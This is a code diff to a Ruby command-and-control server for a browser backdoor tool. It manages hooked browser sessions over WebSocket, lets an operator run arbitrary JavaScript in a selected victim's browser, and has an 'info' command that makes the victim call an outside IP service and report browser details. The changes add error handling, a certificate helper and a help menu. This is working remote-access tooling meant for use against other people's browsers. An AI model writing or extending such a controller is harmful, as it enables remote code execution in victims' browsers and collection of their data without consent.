@@ -32,17 +32,31 @@ require 'em-websocket'
 require 'yaml'
 
 # TODO: Make all the variables besides $wsList non global.
-
 $wsList = Array.new
 $selected = -1
-$CONFIG = YAML.load_file("config.yml")
 def main()
-    Thread.new{startEM()}
+    begin
+        configfile = YAML.load_file("config.yml")
+        Thread.new{startEM(configfile['host'], configfile['port'], configfile['secure'], configfile['priv_key'], configfile['cert_chain'])}
+    rescue => e
+        puts 'Error loading configuration'
+        puts e.message
+        puts e.backtrace
+        return
+    end
     cmdLine()
 end
 
+def print_error(message)
+    puts "[X] " + message
+end
+
+def print_notice(message)
+    puts "[*] " + message
+end
+
 def cmdLine()
-    $welcome_message = ""\
+    welcome_message = ""\
     " ____                                  ____             _       _                  \n"\
     "|  _ \                                |  _ \           | |     | |                 \n"\
     "| |_) |_ __ _____      _____  ___ _ __| |_) | __ _  ___| | ____| | ___   ___  _ __ \n"\
@@ -50,16 +64,28 @@ def cmdLine()
     "| |_) | | | (_) \ V  V /\__ \  __/ |  | |_) | (_| | (__|   < (_| | (_) | (_) | |   \n"\
     "|____/|_|  \___/ \_/\_/ |___/\___|_|  |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_| by IMcPwn\n"\
     "Visit http://imcpwn.com for more information.\n"
-    puts $welcome_message
+    commands = {
+        "help" => "Help menu",
+        "exit" => "Quit the application",
+        "sessions" => "List active sessions",
+        "use" => "Select active session",
+        "info" => "Get session information (IP, User Agent)",
+        "exec" => "Execute a command on a session",
+        "get_cert" => "Get a free TLS certificate from LetsEncrypt",
+        "load" => "Load a module (not implemented"
+    }
+    puts welcome_message
     print "Enter help for help."
     while true
         print "\n> "
         cmdIn = gets.chomp.split()
         case cmdIn[0]
         when "help"
-            puts "Commands\n\nhelp -> this message\nexit -> quit the application and close all sessions\nsessions -> list active sessions\n"\
-            "use -> select a session\ninfo -> get various info (ip, browser info) on selected session\n"\
-            "exec -> execute a command on selected session"\
+            commands.each do |key, array|
+                print key
+                print " --> "
+                puts array
+            end
         when "exit"
             break
         when "sessions"
@@ -73,29 +99,33 @@ def cmdLine()
             }
         when "use"
             if cmdIn.length < 2
-                puts "Invalid usage. Try help for help."
+                print_error("Invalid usage. Try help for help.")
                 next
             end
             selectIn = cmdIn[1].to_i
             if selectIn > $wsList.length - 1
-                puts "Session does not exist."
+                print_error("Session does not exist.")
                 next
             end
             $selected = selectIn
-            puts "Selected session is now " + $selected.to_s + "."
+            print_notice("Selected session is now " + $selected.to_s + ".")
         when "info"
             if $selected == -1 # || TODO: Check if session no longer exists
-                puts "No session selected. Try use SESSION_ID first."
+                print_error("No session selected. Try use SESSION_ID first.")
                 next
             end
             # TODO: Improve method of getting IP address
             commands = ["var xhttp = new XMLHttpRequest();xhttp.open(\"GET\", \"https://ipv4.icanhazip.com/\", false);xhttp.send();xhttp.responseText","navigator.appVersion;", "navigator.platform;", "navigator.language;"]
             commands.each {|cmd|
-                sendCommand(cmd, $wsList[$selected])
+                begin
+                    sendCommand(cmd, $wsList[$selected])
+                rescue
+                    print_error("Error sending command. Selected session may no longer exist.")
+                end
             }
         when "exec"
             if $selected == -1 # || TODO: Check if session no longer exists
-                puts "No session selected. Try use SESSION_ID first."
+                print_error("No session selected. Try use SESSION_ID first.")
                 next
             end
             if cmdIn.length < 2
@@ -104,51 +134,60 @@ def cmdLine()
                     cmdSend = gets.split.join(' ')
                     break if cmdSend == "exit"
                     next if cmdSend == ""
-                    sendCommand(cmdSend, $wsList[$selected])
+                    begin
+                        sendCommand(cmdSend, $wsList[$selected])
+                    rescue
+                        print_error("Error sending command. Selected session may no longer exist.")
+                    end
                 end
             else
                 # TODO: Support space
-                sendCommand(cmdIn[1], $wsList[$selected])
+                begin
+                    sendCommand(cmdIn[1], $wsList[$selected])
+                rescue
+                    print_error("Error sending command. Selected session may no longer exist.")
+                end
             end
+       when "get_cert"
+           if File.file?("getCert.sh")
+               system("./getCert.sh")
+           else
+               print_error("getCert.sh does not exist")
+           end
        else
-           puts "Invalid command. Try help for help."
+           print_error("Invalid command. Try help for help.")
         end
     end
-end
-
-# TODO: Make this method
-def checkSelected()
 end
 
 def sendCommand(cmd, ws)
     ws.send(cmd)
 end
 
-def startEM()
+def startEM(host, port, secure, priv_key, cert_chain)
     EM.run {
         EM::WebSocket.run({
-            # TODO: Validate configuration variables. e.x private key must exist if secure is enabled.
-            :host => $CONFIG['host'],
-            :port => $CONFIG['port'],
-            :secure => $CONFIG['secure'],
+            :host => host,
+            :port => port,
+            :secure => secure,
             :tls_options => {
-                        :private_key_file => $CONFIG['priv_key'],
-                        :cert_chain_file => $CONFIG['cert_chain']
+                        :private_key_file => priv_key,
+                        :cert_chain_file => cert_chain
         }
         }) do |ws|
             $wsList.push(ws)
             ws.onopen { |handshake|
-                puts "\n[*] WebSocket connection open " + handshake.to_s
+                print_notice("WebSocket connection open: " + handshake.to_s)
             }
             ws.onclose {
-                puts "\n[X] Connection closed"
+                print_error("Connection closed")
                 $wsList.delete(ws)
             }
             ws.onmessage { |msg|
-                puts "\n[*] Response received: " + msg
+                print_notice("Response received: " + msg)
             }
             ws.onerror { |e|
-                puts "\n[X] Error " + e.message
+                print_error(e.message)
                 $wsList.delete(ws)
             }
         end
